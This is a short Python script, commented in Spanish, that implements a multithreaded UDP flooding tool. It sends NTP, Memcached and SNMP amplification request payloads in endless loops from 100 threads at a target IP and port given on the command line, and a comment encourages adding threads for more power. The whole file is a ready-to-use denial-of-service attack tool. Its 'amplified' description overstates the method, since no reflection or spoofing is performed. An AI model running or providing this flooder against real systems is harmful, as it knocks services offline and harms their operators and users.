import socket
import threading
import argparse

# Payloads de amplificación conocidos
PAYLOADS = [
    b'\x17\x00\x03\x2a' + b'\x00' * 4,  # NTP
    b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n',  # Memcached
    b'\x30\x26\x02\x01\x01\x04\x06public\xa0\x19\x02\x04\x70\xa7\xa7\x7e\x02\x01\x00\x02\x01\x00\x30\x0b\x30\x09\x06\x05+\x06\x01\x02\x01\x05\x00',  # SNMP
]

THREADS = 100  # Puedes aumentar este número para aún más potencia

def flood(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        for payload in PAYLOADS:
            try:
                sock.sendto(payload, (ip, port))
            except Exception:
                continue

def main():
    parser = argparse.ArgumentParser(description="Envía paquetes UDP amplificados de alto rendimiento.")
    parser.add_argument("ip", help="IP de destino")
    parser.add_argument("port", type=int, help="Puerto de destino")
    args = parser.parse_args()

    print(f"[+] Enviando a {args.ip}:{args.port} con {THREADS} threads. Ctrl+C para detener.")

    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=flood, args=(args.ip, args.port), daemon=True)
        t.start()
        threads.append(t)

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\n[!] Detenido por el usuario.")

if __name__ == "__main__":
    main()
